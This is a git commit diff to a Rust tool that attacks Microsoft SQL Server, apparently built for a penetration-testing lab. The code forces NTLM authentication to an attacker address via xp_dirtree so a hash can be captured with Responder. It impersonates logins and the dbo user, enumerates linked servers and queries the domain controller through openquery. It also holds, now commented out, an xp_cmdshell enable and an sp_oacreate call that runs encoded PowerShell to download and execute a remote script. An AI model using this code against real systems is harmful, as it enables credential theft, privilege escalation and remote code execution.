b996317afb9960d1b15e23f19062fb10d4cc0d07
Dylan Reuter <dreuter@synercomm.com>
2022-08-19 09:35:09 -0500

    bug fix on rows

--- src/main.rs
+++ src/main.rs
@@ -5,7 +5,7 @@ use tiberius::{Config, AuthMethod, Client, Query, QueryStream, Row};
 
 async fn db_conn() -> anyhow::Result<Client<TcpStream>> {
     let mut config = Config::new();
-    config.host("dc01.corp1.com");
+    config.host("appsrv01.corp1.com"); // dc01
     config.database("master");
     config.port(1433);
     config.trust_cert();
@@ -24,13 +24,13 @@ async fn get_query(client: &mut Client<TcpStream>, query: &str, is_str: bool) ->
     let select: Query = Query::new(query);
     let stream: QueryStream = select.query(client).await?;
 
-    let rows: Vec<Row> = stream.into_first_result().await.unwrap();
+    let rows: Vec<Row> = stream.into_first_result().await?;
     let mut rowtext: Vec<String> = Vec::new();
-    for (i, row) in rows.iter().enumerate() {
+    for (_, row) in rows.iter().enumerate() {
         if is_str {
-            rowtext.push(row.get::<&str, _>(i).unwrap().to_string());
+            rowtext.push(row.get::<&str, _>(0).unwrap().to_string());
         } else {
-            rowtext.push(row.get::<i32, _>(i).unwrap().to_string());
+            rowtext.push(row.get::<i32, _>(0).unwrap().to_string());
         }
     }
 
@@ -70,7 +70,7 @@ async fn main() {
     }
 
     println!("[+] Attempting auth back to get svc account hash...Check Responder!");
-    let mut query: String = String::from("EXEC master..xp_dirtree \"\\\\192.168.49.79\\\\test\"");
+    let mut query: String = String::from("EXEC master..xp_dirtree \"\\\\192.168.49.75\\\\test\"");
     execute_query(&mut conn, &query).await;
 
     println!("[+] Checking for users that can be impersonated...");
@@ -78,25 +78,38 @@ async fn main() {
     let impersonate_users: Vec<String> = get_query(&mut conn, &query, true).await.unwrap();
     println!("--> Users that can be impersonated: {:?}", impersonate_users);
 
-    println!("[+] Trying to impersonate {}", impersonate_users[0]);
-    query = String::from(format!("EXECUTE AS LOGIN = '{}'", impersonate_users[0]));
-    execute_query(&mut conn, &query).await;
-
-    if get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap()[0] != user[0] {
-        println!("[+] Success!");
-        println!("--> Now logged in as: {}", get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap()[0]);
-    } else {
-        println!("[!] Could not impersonate user!");
-        println!("[+] Trying to impersonate dbo user...");
-        query = String::from("use msdb; EXECUTE AS USER = 'dbo'");
+    if impersonate_users.len() > 0 {
+        println!("[+] Trying to impersonate {}", impersonate_users[0]);
+        query = String::from(format!("EXECUTE AS LOGIN = '{}'", impersonate_users[0]));
         execute_query(&mut conn, &query).await;
-        let curr_user: Vec<String> = get_query(&mut conn, "SELECT USER_NAME()", true).await.unwrap();
-        if curr_user[0] == "dbo" {
-            println!("[+] Success! Now executing as {}", curr_user[0]);
+
+        if get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap()[0] != user[0] {
+            println!("[+] Success!");
+            println!("--> Now logged in as: {}", get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap()[0]);
         } else {
-            println!("[!] Could not impersonate dbo user");
+            println!("[!] Could not impersonate user!");
+            println!("[+] Trying to impersonate dbo user...");
+            query = String::from("use msdb; EXECUTE AS USER = 'dbo'");
+            execute_query(&mut conn, &query).await;
+            let curr_user: Vec<String> = get_query(&mut conn, "SELECT USER_NAME()", true).await.unwrap();
+            if curr_user[0] == "dbo" {
+                println!("[+] Success! Now executing as {}", curr_user[0]);
+            } else {
+                println!("[!] Could not impersonate dbo user");
+            }
         }
     }
+
+    println!("[+] Checking for linked SQL servers...");
+    let linked: Vec<String> = get_query(&mut conn, "EXEC sp_linkedservers", true).await.unwrap();
+    println!("--> {:?}", linked);
+
+    // let cmd_res: Vec<String> = get_query(&mut conn, "select version from openquery(\"dc01\", 'select @@version as version')", true).await.unwrap();
+    // println!("{}", cmd_res[0]);
+
+    let sub_query: String = String::from("select SYSTEM_USER as s_user"); 
+    query = String::from(format!("select s_user from openquery(\"dc01\", '{}')", &sub_query));
+    println!("--> Executing as {} on DC01:", get_query(&mut conn, &query, true).await.unwrap()[0]);
 
     // println!("[+] Enabling xp_cmdshell");
     // query = String::from("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
@@ -109,8 +122,8 @@ async fn main() {
     execute_query(&mut conn, &query).await;
 
     println!("[+] Executing command");
-    query = String::from("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAOQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==\"'");
-    execute_query(&mut conn, &query).await;
+    // query = String::from("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAOQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==\"'");
+    // execute_query(&mut conn, &query).await;
 
         
 }
